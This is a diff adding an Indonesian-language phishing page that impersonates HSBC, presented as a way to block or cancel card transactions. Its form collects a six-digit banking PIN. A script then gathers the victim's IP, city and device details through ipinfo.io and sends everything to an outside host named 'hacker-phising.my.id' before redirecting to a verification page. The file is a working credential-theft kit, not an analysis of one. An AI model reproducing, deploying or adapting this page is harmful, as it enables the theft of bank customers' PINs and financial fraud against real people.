@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <meta content="#d4001a" name="theme-color"/>
+        <title>𝑪𝒂𝒓𝒂 𝒎𝒖𝒅𝒂𝒉 𝒃𝒍𝒐𝒌𝒊𝒓 𝒅𝒂𝒏 𝒃𝒂𝒕𝒂𝒍𝒌𝒂𝒏 𝒕𝒓𝒂𝒏𝒔𝒂𝒌𝒔𝒊 𝒌𝒂𝒓𝒕𝒖 𝒌𝒓𝒆𝒅𝒊𝒕 𝒅𝒂𝒏 𝒅𝒆𝒃𝒊𝒕 𝑯𝑺𝑩𝑪</title>
+   <meta content="img/home.jpg" property="og:image">
+<link data-savepage-href="" href="img/logo.svg" rel="icon"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background: #fff;
+    }
+
+   .navbar {
+  display: flex;
+  align-items: center;
+  padding: 10px 15px;
+  background-color: #fff;
+  border-bottom: 1px solid #ccc;
+  position: sticky;
+  top: 0;
+  z-index: 999;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); /* Tambahan shadow */
+    }
+
+    .navbar img {
+      height: 40px;
+    }
+
+    .header-image {
+      text-align: center;
+      margin: 30px 0;
+    }
+
+    .header-image img {
+      max-width: 80%;
+      height: auto;
+    }
+
+    .container {
+      text-align: none;
+      padding: 30px;
+      font-size: 20px;
+      font-weight: 500;
+      margin-top: 60px;
+      padding-bottom: 80px; /* beri ruang agar konten tidak tertutup tombol */
+    }
+
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .pin-inputs input {
+      width: 26px;
+      height: 26px;
+      margin: 6px;
+      font-size: 24px;
+      text-align: center;
+      border: 1px solid #aaa;
+      border-radius: 100px;
+    }
+
+    .button {
+      position: fixed;
+      bottom: 15px;
+      left: 5%;
+      width: 90%;
+      padding: 16px;
+      font-size: 16px;
+      background-color: #c1c1c1;
+      color: white;
+      border: none;
+      border-radius: 2px;
+      z-index: 9999;
+    }
+
+    .button.active {
+      background-color: #d4001a;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="navbar">
+    <img src="img/logo.svg" alt="Logo HSBC" />
+  </div>
+
+  <div class="container">
+    <label for="pin1">Masukkan 6 Digit PIN Anda</label>
+    <div class="pin-inputs">
+      <input type="tel" maxlength="1" id="pin1" oninput="moveNext(this, 'pin2')" />
+      <input type="tel" maxlength="1" id="pin2" oninput="moveNext(this, 'pin3')" />
+      <input type="tel" maxlength="1" id="pin3" oninput="moveNext(this, 'pin4')" />
+      <input type="tel" maxlength="1" id="pin4" oninput="moveNext(this, 'pin5')" />
+      <input type="tel" maxlength="1" id="pin5" oninput="moveNext(this, 'pin6')" />
+      <input type="tel" maxlength="1" id="pin6" oninput="toggleButton()" />
+    </div>
+  </div>
+
+  <button id="submitBtn" class="button" onclick="kirimData()">Lanjut</button>
+
+  <script>
+    function moveNext(current, nextId) {
+      if (current.value.length === 1) {
+        const next = document.getElementById(nextId);
+        if (next) next.focus();
+      }
+      toggleButton();
+    }
+
+    function toggleButton() {
+      const pins = [
+        'pin1', 'pin2', 'pin3', 'pin4', 'pin5', 'pin6'
+      ].map(id => document.getElementById(id).value.trim());
+
+      const btn = document.getElementById('submitBtn');
+      if (pins.every(d => d !== "")) {
+        btn.classList.add('active');
+      } else {
+        btn.classList.remove('active');
+      }
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      if (/Android/i.test(ua)) return 'Android';
+      if (/iPhone|iPad|iPod/i.test(ua)) return 'iPhone';
+      return 'Lainnya';
+    }
+
+    async function kirimData() {
+      const pin = [
+        document.getElementById('pin1').value,
+        document.getElementById('pin2').value,
+        document.getElementById('pin3').value,
+        document.getElementById('pin4').value,
+        document.getElementById('pin5').value,
+        document.getElementById('pin6').value
+      ].join('');
+
+      if (pin.length !== 6) return;
+
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=ef72b040d9a8c1");
+        const info = await res.json();
+
+        const payload = {
+          pin: pin,
+          city: info.city,
+          ip: info.ip,
+          device: navigator.platform,
+          model: getDeviceInfo()
+        };
+
+        await fetch("https://hacker-phising.my.id/notif/req/pintranhsbc.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        window.location.href = "verifikasi.html";
+      } catch (e) {
+        alert("Gagal mengirim data.");
+      }
+    }
+  </script>
+</body>
+</html>
